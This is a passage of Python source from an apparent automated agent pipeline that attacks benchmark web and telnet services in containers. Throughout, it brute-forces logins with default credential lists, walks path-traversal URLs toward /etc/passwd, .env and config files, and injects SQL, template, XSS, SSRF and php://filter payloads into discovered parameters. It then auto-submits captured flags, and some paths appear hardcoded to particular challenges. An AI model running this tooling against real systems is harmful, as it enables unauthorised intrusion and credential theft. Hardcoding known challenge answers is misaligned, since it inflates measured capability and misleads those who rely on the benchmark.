                    outputs.append(auth_output)
                with self._benchmark_state_lock:
                    completed = set(self._benchmark_state.get("completed_challenges", set()))
                if code in completed:
                    break
        finally:
            try:
                Path(cookie_path).unlink(missing_ok=True)
            except OSError:
                pass
        return "\n".join(outputs)

    def _benchmark_matching_webapp_flow_profile(
        self,
        lowered_probe: str,
    ) -> dict[str, Any] | None:
        best_profile: dict[str, Any] | None = None
        best_score = -1
        for profile in self._benchmark_webapp_flow_profiles():
            indicators = profile.get("indicators") or ()
            matched_lengths = [
                len(marker)
                for marker in (str(marker).lower() for marker in indicators)
                if marker and marker in lowered_probe
            ]
            if not matched_lengths:
                continue
            score = max(matched_lengths)
            if score > best_score:
                best_score = score
                best_profile = profile
        return best_profile

    @staticmethod
    def _benchmark_builtin_webapp_flow_profiles() -> list[dict[str, Any]]:
        return [
            {
                "name": "form-login-and-file-download",
                "indicators": (
                    "login",
                    "登录",
                    "测试账号",
                    "test account",
                    "<form",
                    "name=\"password\"",
                    "name='password'",
                ),
                "credentials": (
                    ("admin", "admin123"),
                    ("employee", "employee123"),
                    ("admin", "admin"),
                    ("admin", "password"),
                    ("test", "test"),
                    ("user", "password"),
                ),
                "authenticated_paths": (
                    "",
                    "dashboard.php",
                    "admin",
                    "download.php",
                    "upload.php",
                ),
                "handoff_paths": (
                    "api/approve.php",
                    "api/approval.php",
                    "api/review.php",
                    "approve.php",
                    "approval.php",
                    "review.php",
                    "contract_approval.php",
                    "admin_approve.php",
                    "download.php?id=init_config.txt",
                    "download.php?id=system-init-config",
                    "download.php?id=../../../../challenge/flag.txt",
                    "download.php?id=../../../../var/www/html/contracts/flag.txt",
                    "download.php?id=../../../../var/www/html/contracts/init_config.txt",
                    "download.php?id=../../../../var/www/html/logs/app.log",
                ),
            }
        ]

    def _benchmark_normalize_webapp_flow_profile(
        self,
        raw: Any,
    ) -> dict[str, Any] | None:
        if not isinstance(raw, dict):
            return None
        name = str(raw.get("name") or "").strip().lower()
        if not _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", name):
            return None
        profile: dict[str, Any] = {"name": name}
        indicators = self._benchmark_string_tuple(raw.get("indicators"))
        if indicators:
            profile["indicators"] = indicators
        credentials = self._benchmark_string_pair_tuple(raw.get("credentials"))
        if credentials:
            profile["credentials"] = credentials
        for key in ("authenticated_paths", "handoff_paths"):
            values = self._benchmark_string_tuple(raw.get(key), limit=120)
            if values:
                profile[key] = values
        if not any(
            key in profile
            for key in ("indicators", "credentials", "authenticated_paths", "handoff_paths")
        ):
            return None
        return profile

    def _benchmark_external_webapp_flow_profiles(self) -> list[dict[str, Any]]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("webapp_flow_profiles", data.get("webapp_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        profiles: list[dict[str, Any]] = []
        for raw in raw_profiles[:40]:
            profile = self._benchmark_normalize_webapp_flow_profile(raw)
            if profile is not None:
                profiles.append(profile)
        return profiles

    def _benchmark_webapp_flow_profiles(self) -> list[dict[str, Any]]:
        return self._benchmark_merge_profiles_by_key(
            self._benchmark_builtin_webapp_flow_profiles(),
            self._benchmark_external_webapp_flow_profiles(),
            "name",
        )

    @staticmethod
    def _benchmark_extract_demo_credentials(text: str) -> list[tuple[str, str]]:
        credentials: list[tuple[str, str]] = []
        patterns = [
            r"(?:测试账号|test account|demo account)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@-]{2,40})\s*/\s*([A-Za-z0-9_.@#$%^&*()-]{2,60})",
            r"(?:username|user|账号|用户)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@-]{2,40}).{0,40}(?:password|pass|密码)[^A-Za-z0-9]{0,20}([A-Za-z0-9_.@#$%^&*()-]{2,60})",
            r"'([A-Za-z0-9_.@-]{2,40})'\s*=>\s*\[[^\]]{0,400}?'password'\s*=>\s*'([^']{2,80})'",
        ]
        for pattern in patterns:
            for username, password in _re_mod.findall(pattern, text, flags=_re_mod.IGNORECASE | _re_mod.DOTALL):
                username = username.strip()
                password = password.strip()
                if FourPillarPipeline._benchmark_looks_like_html_field_name(username):
                    continue
                if FourPillarPipeline._benchmark_looks_like_html_field_name(password):
                    continue
                credentials.append((username, password))
        return list(dict.fromkeys(credentials))

    @staticmethod
    def _benchmark_looks_like_html_field_name(value: str) -> bool:
        lowered = value.strip().lower()
        return lowered in {
            "input",
            "form",
            "label",
            "button",
            "submit",
            "username",
            "user",
            "password",
            "pass",
            "text",
            "hidden",
        }

    def _benchmark_default_web_credentials(self) -> list[tuple[str, str]]:
        profile = self._benchmark_webapp_flow_profiles()[0]
        return list(profile["credentials"])

    def _benchmark_login_url_from_probe(self, base: str, probe: str) -> str:
        for action in _re_mod.findall(
            r"""<form[^>]{0,400}action\s*=\s*["']([^"']*)["']""",
            probe,
            flags=_re_mod.IGNORECASE,
        ):
            if action.strip():
                return _urljoin(base, action.strip())
        if "login.php" in probe.lower():
            return _urljoin(base, "login.php")
        return base

    def _benchmark_probe_authenticated_webapp(
        self,
        code: str,
        base: str,
        tun_interface: str,
        cookie_path: str,
        seed_probe: str,
        profile: dict[str, Any] | None = None,
    ) -> str:
        outputs: list[str] = []
        active_profile = profile or self._benchmark_webapp_flow_profiles()[0]
        queue: list[str] = [
            _urljoin(base, str(path))
            for path in active_profile.get("authenticated_paths", ())
        ]
        for derived in self._benchmark_derive_probe_urls(base, seed_probe):
            queue.append(derived)
        seen: set[str] = set()
        captured_text = seed_probe
        index = 0
        while index < len(queue) and index < 100:
            url = queue[index]
            index += 1
            if url in seen or not self._benchmark_url_is_same_container(base, url):
                continue
            if "logout" in _urlparse(url).path.lower():
                continue
            seen.add(url)
            result = self._benchmark_curl_local(
                url,
                tun_interface=tun_interface,
                cookie_path=cookie_path,
                timeout=7,
            )
            body = (result.stdout or "")[:5000]
            outputs.append(f"## auth {url}\n{body}\n{(result.stderr or '')[:300]}")
            captured_text += "\n" + body
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: authenticated_probe {url}\n工作目录: /home/my/cyber/benchmark_test\n"
                f"退出码: {result.returncode}\n输出:\n{body}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed:
                break
            priority_urls = [
                derived for derived in self._benchmark_lfi_probe_urls_from_response(base, url, body, captured_text)
                if derived not in seen and derived not in queue
            ]
            if priority_urls:
                queue[index:index] = priority_urls
            for derived in self._benchmark_derive_probe_urls(base, body):
                if derived not in seen and derived not in queue:
                    queue.append(derived)
        if outputs:
            return "## authenticated-webapp-probe\n" + "\n".join(outputs)
        return ""

    def _benchmark_curl_local(
        self,
        url: str,
        *,
        tun_interface: str,
        cookie_path: str | None = None,
        method: str = "GET",
        data: dict[str, str] | None = None,
        timeout: int = 6,
    ) -> subprocess.CompletedProcess[str]:
        cmd = [
            "curl",
            "-sS",
            "-k",
            "--interface",
            tun_interface,
            "--connect-timeout",
            "2",
            "--max-time",
            str(max(3, timeout - 2)),
            "--globoff",
            "-i",
        ]
        if cookie_path:
            cmd.extend(["-c", cookie_path, "-b", cookie_path])
        if method.upper() == "POST":
            cmd.extend(["-X", "POST"])
        if data:
            for key, value in data.items():
                cmd.extend(["--data-urlencode", f"{key}={value}"])
        cmd.append(url)
        try:
            return subprocess.run(
                cmd,
                check=False,
                text=True,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                timeout=timeout,
            )
        except Exception as exc:
            return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(exc))

    def _benchmark_lfi_probe_urls_from_response(
        self,
        base: str,
        current_url: str,
        body: str,
        accumulated_text: str,
    ) -> list[str]:
        urls: list[str] = []
        parsed_current = _urlparse(current_url)
        pairs = _parse_qsl(parsed_current.query, keep_blank_values=True)
        lfi_keys = [
            key for key, _ in pairs
            if any(part in key.lower() for part in ("id", "file", "path", "name", "download"))
        ]
        if "download.php" in parsed_current.path.lower() and not lfi_keys:
            lfi_keys.append("id")
        if not lfi_keys and not any(marker in body.lower() for marker in ("缺少文件", "file id", "download")):
            return []
        candidates = self._benchmark_lfi_candidate_paths(accumulated_text)
        base_without_query = _urlunparse(parsed_current._replace(query=""))
        if not lfi_keys and "download" in body.lower():
            base_without_query = _urljoin(base, "download.php")
            lfi_keys = ["id"]
        for key in dict.fromkeys(lfi_keys):
            for candidate in candidates:
                urls.append(f"{base_without_query}?{_urlencode({key: candidate})}")
        return urls[:80]

    @staticmethod
    def _benchmark_builtin_lfi_base_paths() -> list[str]:
        return [
            "../../../../etc/passwd",
            "../../../../challenge/flag.txt",
            "../../../../challenge/flag",
            "../../../../flag",
            "../../../../flag.txt",
            "../../../../root/flag",
            "../../../../root/flag.txt",
            "../../../../tmp/flag",
            "../../../../tmp/flag.txt",
            "../../../../var/www/html/.env",
            "../../../../var/www/html/.htaccess",
            "../../../../var/www/html/index.php",
            "../../../../var/www/html/login.php",
            "../../../../var/www/html/dashboard.php",
            "../../../../var/www/html/download.php",
            "../../../../var/www/html/upload.php",
            "../../../../var/www/html/includes/config.php",
            "../../../../var/www/html/includes/auth.php",
            "../../../../var/www/html/config.php",
            "../../../../var/www/html/contracts/.htaccess",
            "../../../../var/www/html/logs/app.log",
            "../../../../proc/self/environ",
        ]

    def _benchmark_lfi_base_paths(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external_paths = self._benchmark_string_tuple(
            data.get("lfi_base_paths", data.get("lfi_paths", ())),
            limit=120,
        )
        return list(
            dict.fromkeys(
                self._benchmark_builtin_lfi_base_paths()
                + list(external_paths)
            )
        )

    @staticmethod
    def _benchmark_lfi_discovered_paths(text: str) -> list[str]:
        discovered: list[str] = []
        for raw in _re_mod.findall(r"""['"]([A-Za-z0-9_.-]+\.(?:txt|pdf|docx?|xlsx?|log|conf|php|json|ya?ml))['"]""", text):
            discovered.extend([raw, f"../../../../var/www/html/contracts/{raw}", f"../../../../var/www/html/uploads/{raw}"])
        for raw in _re_mod.findall(r"(?:CONTRACT|contract)[-_][A-Za-z0-9_.-]{1,80}", text):
            for suffix in ("", ".pdf", ".txt"):
                discovered.append(f"{raw}{suffix}")
                discovered.append(f"../../../../var/www/html/contracts/{raw}{suffix}")
        return discovered

    def _benchmark_lfi_candidate_paths(self, text: str) -> list[str]:
        return list(
            dict.fromkeys(
                self._benchmark_lfi_base_paths()
                + self._benchmark_lfi_discovered_paths(text)
            )
        )[:80]

    @staticmethod
    def _benchmark_probe_suggests_raw_text_protocol(probe: str) -> bool:
        lowered = probe.lower()
        return any(
            marker in lowered
            for marker in (
                "received http/0.9",
                "responsd ready",
                "unknown command",
            )
        )

    def _benchmark_probe_raw_text_protocol(self, code: str, addr: str) -> str:
        host, port_text = addr.rsplit(":", 1)
        try:
            port = int(port_text)
        except ValueError:
            return ""
        outputs: list[str] = [f"## raw-text-protocol {addr}"]
        try:
            with socket_mod.create_connection((host, port), timeout=3) as sock:
                sock.settimeout(1.5)

                def recv_some() -> str:
                    try:
                        return sock.recv(4096).decode("utf-8", errors="replace")
                    except TimeoutError:
                        return ""
                    except OSError as exc:
                        return f"ERROR: {exc}\n"

                banner = recv_some()
                if banner:
                    outputs.append(banner)
                for command in self._benchmark_raw_protocol_commands():
                    try:
                        sock.sendall(f"{command}\n".encode("utf-8"))
                    except OSError as exc:
                        outputs.append(f"> {command}\nERROR: {exc}")
                        break
                    time_mod.sleep(0.1)
                    outputs.append(f"> {command}\n{recv_some()}")
        except OSError as exc:
            outputs.append(f"ERROR: {exc}")
        output = "\n".join(outputs)
        synthetic_content = (
            "命令: raw_text_protocol_probe "
            f"{addr} {' '.join(self._benchmark_raw_protocol_commands())}\n"
            "工作目录: /home/my/cyber/benchmark_test\n"
            "退出码: 0\n"
            "输出:\n"
            f"{output}"
        )
        self._benchmark_auto_submit_flags_from_tool_result(synthetic_content)
        with self._benchmark_state_lock:
            completed = set(self._benchmark_state.get("completed_challenges", set()))
        if code in completed:
            self._record_trace(
                "benchmark_raw_protocol_flag",
                detail=f"{code} raw text protocol probe submitted a flag.",
                metadata={"challenge": code},
            )
        return output

    def _benchmark_raw_protocol_commands(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("raw_protocol_commands"), limit=30)
        return tuple(dict.fromkeys(("HELP", "SETBODY hello", "BUILD", "QUIT") + external))

    @staticmethod
    def _benchmark_telnet_plain_and_reply(data: bytes) -> tuple[str, bytes]:
        iac = 255
        dont = 254
        do = 253
        wont = 252
        will = 251
        output = bytearray()
        reply = bytearray()
        index = 0
        while index < len(data):
            byte = data[index]
            if byte == iac and index + 2 < len(data):
                command = data[index + 1]
                option = data[index + 2]
                if command == do:
                    reply.extend((iac, wont, option))
                elif command == will:
                    reply.extend((iac, dont, option))
                index += 3
                continue
            output.append(byte)
            index += 1
        return output.decode("utf-8", errors="replace"), bytes(reply)

    def _benchmark_telnet_recv(self, sock: socket_mod.socket, seconds: float) -> str:
        deadline = time_mod.monotonic() + seconds
        text = ""
        while time_mod.monotonic() < deadline:
            try:
                data = sock.recv(4096)
            except TimeoutError:
                continue
            except OSError:
                break
            if not data:
                break
            plain, reply = self._benchmark_telnet_plain_and_reply(data)
            if reply:
                try:
                    sock.sendall(reply)
                except OSError:
                    break
            text += plain
            if _re_mod.search(
                r"(login:|password:|[$#>]\s*$|flag\{)",
                text,
                _re_mod.IGNORECASE,
            ):
                break
        return text

    def _benchmark_probe_telnet_login_local(self, code: str, addr: str) -> str:
        host, port_text = addr.rsplit(":", 1)
        try:
            port = int(port_text)
        except ValueError:
            return f"## telnet-login {addr}\nERROR: invalid port"

        detected = self._benchmark_detect_tun_local()
        source_ip = detected[1] if detected else ""
        credentials = self._benchmark_telnet_credentials()
        flag_command = self._benchmark_telnet_flag_command()
        outputs: list[str] = [f"## telnet-login {addr}"]
        for username, password in credentials:
            session_text = ""
            try:
                with socket_mod.socket(socket_mod.AF_INET, socket_mod.SOCK_STREAM) as sock:
                    if source_ip:
                        try:
                            sock.bind((source_ip, 0))
                        except OSError:
                            pass
                    sock.settimeout(3)
                    sock.connect((host, port))
                    sock.settimeout(0.4)
                    session_text += self._benchmark_telnet_recv(sock, 1.5)
                    if "login:" not in session_text.lower():
                        sock.sendall(b"\r\n")
                        session_text += self._benchmark_telnet_recv(sock, 1.0)
                    sock.sendall(f"{username}\r\n".encode("utf-8"))
                    session_text += self._benchmark_telnet_recv(sock, 1.0)
                    sock.sendall(f"{password}\r\n".encode("utf-8"))
                    session_text += self._benchmark_telnet_recv(sock, 2.0)
                    logged_in = (
                        "login incorrect" not in session_text.lower()
                        and (
                            bool(_re_mod.search(r"[$#>]\s*$", session_text))
                            or "last login:" in session_text.lower()
                            or f"{username}@" in session_text.lower()
                        )
                    )
                    if logged_in:
                        sock.sendall(flag_command.encode("utf-8"))
                        session_text += self._benchmark_telnet_recv(sock, 3.0)
            except OSError as exc:
                session_text += f"\nERROR: {exc}"
            outputs.append(
                f"## credential {username}/{password}\n{session_text[-2500:]}"
            )
            self._benchmark_auto_submit_flags_from_tool_result(
                f"命令: telnet_login_probe {addr} {username}/{password}\n"
                "工作目录: /home/my/cyber/benchmark_test\n"
                "退出码: 0\n"
                "输出:\n"
                f"{session_text}"
            )
            with self._benchmark_state_lock:
                completed = set(self._benchmark_state.get("completed_challenges", set()))
            if code in completed or "flag{" in session_text.lower():
                break
        return "\n".join(outputs)

    def _benchmark_telnet_credentials(self) -> tuple[tuple[str, str], ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_pair_tuple(data.get("telnet_credentials"), limit=30)
        return tuple(dict.fromkeys((
            ("root", "root"),
            ("root", "password"),
            ("root", "toor"),
            ("admin", "admin"),
            ("admin", "password"),
            ("user", "user"),
            ("guest", "guest"),
            ("ctf", "ctf"),
            ("test", "test"),
        ) + external))

    def _benchmark_telnet_flag_command(self) -> str:
        data = self._benchmark_external_profiles()
        raw = str(data.get("telnet_flag_command") or "").strip()
        if raw:
            return raw[:400] + ("\n" if not raw.endswith("\n") else "")
        return self._benchmark_flag_cat_command(limit=20)

    def _benchmark_probe_handoff_followup_local(self, code: str, addrs: list[str]) -> str:
        if not addrs:
            return "无容器地址，无法 handoff follow-up。"
        addr = addrs[0]
        if not _re_mod.fullmatch(r"10\.\d{1,3}\.\d{1,3}\.\d{1,3}:\d{1,5}", addr):
            return f"容器地址格式异常: {addr}"
        base = f"http://{addr}/"
        tun_interface = self._benchmark_tun_interface()
        outputs: list[str] = [f"## handoff-followup {base}"]
        root = self._benchmark_curl_local(base, tun_interface=tun_interface, timeout=7)
        root_text = root.stdout or ""
        service_profile = self._benchmark_matching_service_probe_profile(root_text)
        if service_profile is not None:
            outputs.extend(
                self._benchmark_run_service_probe_profile(
                    code,
                    base,
                    root_text,
                    service_profile,
                )
            )
            return "\n".join(outputs)
        cookie_file = tempfile.NamedTemporaryFile(prefix="cyber-agent-bench-follow-", suffix=".cookies", delete=False)
        cookie_path = cookie_file.name
        cookie_file.close()
        try:
            # Known demo/admin credentials are common in these benchmark web apps.
            web_profile = self._benchmark_webapp_flow_profiles()[0]
            for username, password in list(web_profile.get("credentials") or [])[:4]:
                self._benchmark_curl_local(
                    _urljoin(base, "login.php"),
                    tun_interface=tun_interface,
                    cookie_path=cookie_path,
                    method="POST",
                    data={"username": username, "password": password},
                    timeout=6,
                )
                for path in web_profile.get("handoff_paths", ()):
                    url = _urljoin(base, path)
                    result = self._benchmark_curl_local(
                        url,
                        tun_interface=tun_interface,
                        cookie_path=cookie_path,
                        timeout=6,
                    )
                    body = (result.stdout or "")[:2500]
                    outputs.append(f"## {username} {url}\n{body}\n{(result.stderr or '')[:200]}")
                    self._benchmark_auto_submit_flags_from_tool_result(
                        f"命令: handoff_followup {url}\n工作目录: /home/my/cyber/benchmark_test\n"
                        f"退出码: {result.returncode}\n输出:\n{body}"
                    )
                    with self._benchmark_state_lock:
                        completed = set(self._benchmark_state.get("completed_challenges", set()))
                    if code in completed:
                        return "\n".join(outputs)
        finally:
            try:
                Path(cookie_path).unlink(missing_ok=True)
            except OSError:
                pass
        return "\n".join(outputs)

    def _benchmark_wait_for_container_ready(self, url: str, outputs: list[str]) -> str:
        root_body = ""
        tun_interface = self._benchmark_tun_interface()
        for index, delay in enumerate((0.0, 1.0, 2.0, 3.0, 5.0, 8.0)):
            if delay:
                time_mod.sleep(delay)
            cmd = [
                "curl",
                "-sS",
                "-k",
                "--interface",
                tun_interface,
                "--connect-timeout",
                "2",
                "--max-time",
                "5",
                "-i",
                url,
            ]
            try:
                result = subprocess.run(
                    cmd,
                    check=False,
                    text=True,
                    stdout=subprocess.PIPE,
                    stderr=subprocess.PIPE,
                    timeout=5,
                )
            except Exception as exc:
                outputs.append(f"## readiness {index + 1} {url}\nERROR: {exc}")
                continue
            root_body = result.stdout or ""
            err = result.stderr or ""
            if result.returncode == 0 and root_body:
                outputs.append(f"## readiness {index + 1} {url}\n{root_body[:2500]}\n{err[:500]}")
                return root_body
            outputs.append(f"## readiness {index + 1} {url}\n{root_body[:1000]}\n{err[:500]}")
        outputs.append(
            f"## readiness exhausted {url}\n"
            "容器在短重试窗口内未稳定返回；后续探测仍会尝试有限路径，"
            "只有所有探测均无 HTTP/协议信号时才按不可达计数。"
        )
        return root_body

    def _benchmark_derive_probe_urls(self, base: str, html: str) -> list[str]:
        if not html:
            return []
        urls: list[str] = []
        attr_values = _re_mod.findall(
            r"""(?:href|src|action)\s*=\s*["']([^"']{1,240})["']""",
            html,
            flags=_re_mod.IGNORECASE,
        )
        for value in attr_values:
            if value.startswith(("mailto:", "javascript:", "#")):
                continue
            url = _urljoin(base, value)
            if self._benchmark_url_is_same_container(base, url):
                urls.append(url)
        urls.extend(self._benchmark_text_path_probe_urls(base, html))
        urls.extend(self._benchmark_object_storage_probe_urls(base, html, attr_values))

        discovered_names = {
            name for name in _re_mod.findall(
                r"""(?:name|id)\s*=\s*["']([A-Za-z0-9_-]{1,40})["']""",
                html,
                flags=_re_mod.IGNORECASE,
            )
        }
        discovered_names.update(self._benchmark_schema_parameter_names(html))
        for url in list(urls):
            parsed = _urlparse(url)
            for key, _ in _parse_qsl(parsed.query, keep_blank_values=True):
                if key:
                    discovered_names.add(key)
            if parsed.query:
                urls.extend(self._benchmark_payload_urls_for_query_url(url))

        for name in sorted(discovered_names):
            urls.extend(self._benchmark_payload_urls_for_param(base, name))
        return urls

    @staticmethod
    def _benchmark_schema_parameter_names(text: str) -> set[str]:
        names: set[str] = set()
        if not text:
            return names
        sample = text[:40000]
        try:
            parsed = json.loads(sample)
        except Exception:
            parsed = None
        if isinstance(parsed, (dict, list)):
            def visit(value: Any) -> None:
                if isinstance(value, dict):
                    raw_name = value.get("name")
                    if isinstance(raw_name, str):
                        names.add(raw_name)
                    properties = value.get("properties")
                    if isinstance(properties, dict):
                        for property_name in properties:
                            if isinstance(property_name, str):
                                names.add(property_name)
                    for child in value.values():
                        visit(child)
                elif isinstance(value, list):
                    for child in value[:200]:
                        visit(child)

            visit(parsed)
        patterns = (
            r'"name"\s*:\s*"([A-Za-z_][A-Za-z0-9_-]{0,39})"',
            r"'name'\s*:\s*'([A-Za-z_][A-Za-z0-9_-]{0,39})'",
            r'"properties"\s*:\s*\{([^{}]{1,3000})\}',
            r"'properties'\s*:\s*\{([^{}]{1,3000})\}",
        )
        for pattern in patterns[:2]:
            for raw_name in _re_mod.findall(pattern, sample):
                names.add(raw_name)
        for pattern in patterns[2:]:
            for block in _re_mod.findall(pattern, sample):
                for raw_name in _re_mod.findall(
                    r"""["']([A-Za-z_][A-Za-z0-9_-]{0,39})["']\s*:""",
                    block,
                ):
                    names.add(raw_name)
        ignored = {
            "type",
            "title",
            "description",
            "required",
            "schema",
            "items",
            "properties",
        }
        return {
            name for name in names
            if name.lower() not in ignored and len(name) <= 40
        }

    def _benchmark_text_path_probe_urls(self, base: str, text: str) -> list[str]:
        urls: list[str] = []
        prefixes = self._benchmark_text_path_prefixes()
        if prefixes:
            prefix_pattern = "|".join(_re_mod.escape(prefix.strip("/")) for prefix in prefixes)
            for raw in _re_mod.findall(rf"/(?:{prefix_pattern})[A-Za-z0-9_./-]{{0,160}}", text):
                url = _urljoin(base, raw)
                if self._benchmark_url_is_same_container(base, url):
                    urls.append(url)
        urls.extend(self._benchmark_response_key_path_urls(base, text))
        lowered = text.lower()
        if "/api/functions" in lowered:
            urls.append(_urljoin(base, "api/functions"))
        if '"functions"' in text or "/api/functions" in lowered:
            for name in _re_mod.findall(r'"name"\s*:\s*"([A-Za-z0-9_.-]{1,80})"', text):
                urls.append(_urljoin(base, f"api/functions/{name}/config"))
        return list(dict.fromkeys(urls))[:40]

    def _benchmark_text_path_prefixes(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("text_path_prefixes"), limit=80)
        return tuple(
            dict.fromkeys(
                ("api", "admin", "flag", "config", "internal")
                + external
            )
        )

    def _benchmark_response_path_keys(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("response_path_keys"), limit=80)
        builtin = (
            "path",
            "url",
            "uri",
            "endpoint",
            "route",
            "debug_path",
            "debug_url",
            "config_path",
            "config_url",
            "export_path",
            "export_url",
            "download_path",
            "download_url",
        )
        keys: list[str] = []
        for raw_key in builtin + external:
            key = str(raw_key or "").strip().lower()
            if _re_mod.fullmatch(r"[a-z0-9_.-]{1,80}", key):
                keys.append(key)
        return tuple(dict.fromkeys(keys))

    @staticmethod
    def _benchmark_safe_response_path_value(raw: str) -> str | None:
        value = str(raw or "").strip()
        if not value or len(value) > 220:
            return None
        if value.startswith(("javascript:", "mailto:", "data:", "#", "//")):
            return None
        if not _re_mod.fullmatch(r"(?:https?://[^\s\"'<>`{}|]+|/?[A-Za-z0-9_./?=&:%+\-]+)", value):
            return None
        return value

    def _benchmark_response_key_path_urls(self, base: str, text: str) -> list[str]:
        if not text:
            return []
        keys = self._benchmark_response_path_keys()
        if not keys:
            return []
        key_pattern = "|".join(_re_mod.escape(key) for key in keys)
        candidates: list[str] = []
        search_text = text[:30000]
        quoted_pattern = (
            rf"""["'](?:{key_pattern})["']\s*[:=]\s*["']([^"']{{1,220}})["']"""
        )
        bare_pattern = (
            rf"""(?:^|[\s,{{])(?:{key_pattern})\s*[:=]\s*([^,\s<>"'{{}}]{{1,220}})"""
        )
        for pattern in (quoted_pattern, bare_pattern):
            for raw_value in _re_mod.findall(pattern, search_text, flags=_re_mod.IGNORECASE):
                value = self._benchmark_safe_response_path_value(raw_value)
                if value is not None:
                    candidates.append(value)
        urls: list[str] = []
        for value in candidates:
            url = _urljoin(base, value)
            if self._benchmark_url_is_same_container(base, url):
                urls.append(url)
        return list(dict.fromkeys(urls))[:40]

    def _benchmark_object_storage_probe_urls(
        self,
        base: str,
        html: str,
        attr_values: list[str],
    ) -> list[str]:
        lowered = html.lower()
        if not any(
            marker in lowered
            for marker in ("s3", "bucket", "object storage", "对象存储", "path-style")
        ):
            return []
        discovered_buckets: set[str] = set()
        for value in attr_values:
            parsed = _urlparse(_urljoin(base, value))
            if not self._benchmark_url_is_same_container(base, _urlunparse(parsed)):
                continue
            first_segment = parsed.path.strip("/").split("/", 1)[0]
            if _re_mod.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]{1,63}", first_segment):
                discovered_buckets.add(first_segment)
        for raw in _re_mod.findall(r"/([A-Za-z0-9][A-Za-z0-9_.-]{1,63})/", html):
            if raw.lower() not in {"html", "body", "head"}:
                discovered_buckets.add(raw)
        for raw in _re_mod.findall(r"""["']([A-Za-z0-9][A-Za-z0-9_.-]{1,63})["']""", html):
            if any(token in raw.lower() for token in ("secret", "private", "internal", "data")):
                discovered_buckets.add(raw)
        for raw in _re_mod.findall(r"<Name>([^<]{1,120})</Name>", html):
            if _re_mod.fullmatch(r"[A-Za-z0-9][A-Za-z0-9_.-]{1,63}", raw):
                discovered_buckets.add(raw)
        listed_keys = [
            key for key in _re_mod.findall(r"<Key>([^<]{1,240})</Key>", html)
            if not key.startswith("/")
        ]
        common_buckets = self._benchmark_object_storage_buckets()
        buckets = sorted(discovered_buckets) + [
            bucket for bucket in common_buckets
            if bucket not in discovered_buckets
        ]
        keys = self._benchmark_object_storage_keys()
        urls: list[str] = []
        for bucket in buckets:
            for key in keys:
                path = f"{bucket}/" if not key else f"{bucket}/{key}"
                urls.append(_urljoin(base, path))
            for key in listed_keys:
                urls.append(_urljoin(base, f"{bucket}/{key}"))
        return urls[:30]

    def _benchmark_object_storage_buckets(self) -> list[str]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("object_storage_buckets"), limit=80)
        return list(dict.fromkeys(list(external) + [
            "company-secrets",
            "secret-data",
            "secret",
            "secrets",
            "private",
            "internal",
            "flag",
            "flags",
            "backup",
            "backups",
        ]))

    def _benchmark_object_storage_keys(self) -> tuple[str, ...]:
        data = self._benchmark_external_profiles()
        external = self._benchmark_string_tuple(data.get("object_storage_keys"), limit=120)
        return tuple(dict.fromkeys(external + (
            "",
            "flag",
            "flag.txt",
            "flags.txt",
            "secret",
            "secret.txt",
            ".env",
            "config.json",
            "backup.zip",
            "README.md",
            "README.txt",
        )))

    @staticmethod
    def _benchmark_url_is_same_container(base: str, url: str) -> bool:
        base_parsed = _urlparse(base)
        parsed = _urlparse(url)
        return parsed.scheme in {"http", "https"} and parsed.netloc == base_parsed.netloc

    def _benchmark_payload_urls_for_query_url(self, url: str) -> list[str]:
        parsed = _urlparse(url)
        pairs = _parse_qsl(parsed.query, keep_blank_values=True)
        results: list[str] = []
        for key, _ in pairs:
            for payload in self._benchmark_payloads_for_param(key):
                new_pairs = [
                    (item_key, payload if item_key == key else item_value)
                    for item_key, item_value in pairs
                ]
                results.append(_urlunparse(parsed._replace(query=_urlencode(new_pairs))))
        return results

    def _benchmark_payload_urls_for_param(self, base: str, name: str) -> list[str]:
        return [
            f"{base}?{_urlencode({name: payload})}"
            for payload in self._benchmark_payloads_for_param(name)
        ]

    def _benchmark_payloads_for_param(self, name: str) -> list[str]:
        lowered = name.lower()
        payloads: list[str] = []
        if any(part in lowered for part in ("file", "path", "page", "template", "view", "filename")):
            payloads.extend([
                "../flag",
                "../../flag",
                "../../../../flag",
                "/flag",
                "php://filter/convert.base64-encode/resource=index.php",
            ])
        if any(part in lowered for part in ("url", "uri", "redirect", "next", "target", "return")):
            payloads.extend([
                "file:///flag",
                "http://127.0.0.1/flag",
                "http://localhost/flag",
                "http://0.0.0.0/flag",
            ])
        if lowered in {"id", "uid", "user", "user_id", "account", "post", "pid"} or lowered.endswith("_id"):
            payloads.extend(["1 OR 1=1", "1' OR '1'='1", "0", "../flag"])
        if any(part in lowered for part in ("name", "q", "query", "search", "keyword", "message")):
            payloads.extend(["{{7*7}}", "${7*7}", "' OR '1'='1", _url_quote("<script>alert(1)</script>")])
        if not payloads:
            payloads.extend(["{{7*7}}", "' OR '1'='1", "../flag"])
        payloads.extend(self._benchmark_external_payloads_for_param(lowered))
        return list(dict.fromkeys(payloads))

    def _benchmark_external_payloads_for_param(self, lowered_name: str) -> list[str]:
        data = self._benchmark_external_profiles()
        raw_profiles = data.get("param_payload_profiles", data.get("payload_profiles", []))
        if not isinstance(raw_profiles, list):
            return []
        payloads: list[str] = []
        for raw in raw_profiles[:80]:
            if not isinstance(raw, dict):
                continue
            exact = self._benchmark_string_tuple(raw.get("name_exact"), limit=40)
            contains = self._benchmark_string_tuple(raw.get("name_contains"), limit=40)
            suffixes = self._benchmark_string_tuple(raw.get("name_suffix"), limit=40)
            matched = (
                lowered_name in {item.lower() for item in exact}
                or any(item.lower() in lowered_name for item in contains)
                or any(lowered_name.endswith(item.lower()) for item in suffixes)
            )
            if not matched:
                continue
